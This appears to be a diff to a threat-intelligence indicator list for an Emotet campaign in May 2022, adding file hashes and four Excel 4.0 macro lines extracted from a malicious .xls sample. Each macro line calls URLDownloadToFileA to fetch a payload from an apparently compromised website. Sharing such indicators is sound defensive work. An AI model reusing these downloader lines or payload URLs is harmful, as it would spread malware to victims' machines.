@@ -2,8 +2,17 @@ Emotet 2022 | epoch4 | 18.05.2022 |
 
 ************************************************************************************************************
 
+.xls 871c3a560fe16ebb0c953f84ff95e05eb7c5075b8356b09aa43bddeec9c21826
+
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://oftalmocity.com/wp-admin/xDjDiXhcS/", "..\hvxda.ocx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "htttp://www.omarhospital.com/wp-content/Ved4BBJms7gwl2/", "..\hvxda.ocx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://www.muslimproperty.co.uk/cgi-bin/8lS/", "..\hvxda.ocx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "http://goodfriendsdriving.com/createschedule/F0jGvgTiFAMRh2Tr8HL/", "..\hvxda.ocx")
+
+************************************************************************************************************
+
 .zip 4a18d9c74c763d165d598ef0f2df9339009825edf54b2ef2f2d8bcba5cd33289
-.xls da9abd0dd8da13b96d51ff0612460e355863642bd5c953fe7aefece2bdc23b08
+.lnk da9abd0dd8da13b96d51ff0612460e355863642bd5c953fe7aefece2bdc23b08
 .dll 2adb0e66ffcb01ce3d105fa895a443199497e58b40ba4ed3cdd7fb5543c0130e
 
 ************************************************************************************************************
